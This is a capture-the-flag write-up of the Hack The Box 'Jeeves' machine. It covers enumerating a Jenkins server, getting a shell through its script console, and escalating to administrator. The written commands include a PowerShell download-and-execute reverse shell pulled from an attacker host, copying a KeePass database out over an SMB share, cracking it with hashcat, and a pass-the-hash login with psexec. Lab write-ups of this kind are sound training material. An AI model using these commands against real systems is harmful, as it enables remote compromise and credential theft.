# Jeeves Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

nmap -sC -sV -oA jeeves 10.10.10.63 -T4

80/tcp    open  http         Microsoft IIS httpd 10.0

135/tcp   open  msrpc        Microsoft Windows RPC

445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

50000/tcp open  http         Jetty 9.4.z-SNAPSHOT

# ${{\color{purple}Initial Foothold}}\ $

### After a long enumeration I found a directory on the port 50000 :

gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30

![image](https://user-images.githubusercontent.com/123066149/221349079-693bf87d-ce77-42a4-9202-9c5870f16c3b.png)

### And finally it's a jenkins server on this port :

### I made the following compromise after a long enumeration of the application :

![1](https://user-images.githubusercontent.com/123066149/221349399-6e26767c-4b25-4c35-8bb4-4c6790419b08.PNG)

![2](https://user-images.githubusercontent.com/123066149/221349403-c52a5a33-8b6b-424e-b505-3799e021f3e7.PNG)

![3](https://user-images.githubusercontent.com/123066149/221349405-39f5cdac-29cd-4fad-b038-cc229889d3db.PNG)

![4](https://user-images.githubusercontent.com/123066149/221349410-be77cc48-4028-4243-be5c-6ddf64e313ee.PNG)

# ${{\color{purple}Exploitation}}\ $

### I used a rev shell powershell to take control of the server :

``println "powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')".execute().text``

![image](https://user-images.githubusercontent.com/123066149/221349919-b08817a5-18a0-4eb7-8b91-e40a7951a69f.png)

![image](https://user-images.githubusercontent.com/123066149/221349939-b89184b9-59e7-4359-b400-dd4c66c8d1a4.png)

# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/221349980-62a6e845-6120-4764-a519-f86357e2cfe2.png)

### SMBserver on kali machine :

/usr/bin/impacket-smbserver kali .

![image](https://user-images.githubusercontent.com/123066149/221350050-1069ded2-46ff-4bf3-8532-6e21b7196467.png)

### mount share on windows machine :

``New-PSDrive -Name "sophie" -PSProvider "FileSystem" -Root "\\10.10.16.5\kali"``

``cd sophie:``

``cp C:\Users\kohsuke\Documents\CEH.kdbx .``

![5](https://user-images.githubusercontent.com/123066149/221350106-9358a2d7-d76f-4c1d-ade3-b3dd7849ad1d.PNG)

### Generate the hash of this file :

keepass2john CEH.kdbx

![image](https://user-images.githubusercontent.com/123066149/221350158-dcc7110f-8e0c-4e31-afea-ded436ef0ae5.png)

![image](https://user-images.githubusercontent.com/123066149/221350172-25786dd9-2d05-4cba-84c5-b8a39a82847f.png)

![image](https://user-images.githubusercontent.com/123066149/221350203-affa1903-fc80-47cf-bfa3-ae865ec83c7f.png)

### Finds the password with hashcat :

hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt

![image](https://user-images.githubusercontent.com/123066149/221350242-2a736320-afce-4401-a245-bd09e1496b46.png)

### Open the kdbx file with keepass :

![image](https://user-images.githubusercontent.com/123066149/221350296-925eda47-478c-48a4-a404-97f263246747.png)

### I tried the admin password but without success and with the hash of the backup account and we are admin :

/usr/bin/impacket-psexec  administrator@10.10.10.63

/usr/bin/impacket-psexec  administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

![image](https://user-images.githubusercontent.com/123066149/221350360-0b5fb083-eb17-4532-892c-511109165051.png)


### Last difficulty display the root password  :

``powershell (Get-Content hm.txt -Stream root.txt)``

![image](https://user-images.githubusercontent.com/123066149/221350462-3f880fc4-b85d-430d-a022-c93609025ea5.png)


# ${{\color{purple}Points of Improvement}}\ $

